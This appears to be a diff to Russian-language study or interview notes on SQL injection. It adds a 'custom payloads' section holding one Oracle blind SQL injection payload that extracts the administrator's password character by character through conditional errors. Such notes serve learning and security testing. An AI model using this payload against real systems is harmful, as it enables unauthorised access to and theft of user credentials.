@@ -74,3 +74,11 @@
 
 
  *«SQLi — одна из самых опасных уязвимостей OWASP Top 10. В своей практике я сталкивался с ней в ERP-системе: запросы строились через самописную ORM без параметризации. Я смог выполнить произвольные запросы к БД, получить данные пользователей и повысить привилегии до администратора. Исправляли через внедрение параметризованных запросов и изоляцию API-слоя».* 🚀
+
+
+ ### CUSTOM PAYLOADS
+
+ # BLIND SQL WITH CONDITIONAL RESPONSE
+
+ # ORACLE:
+ param=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
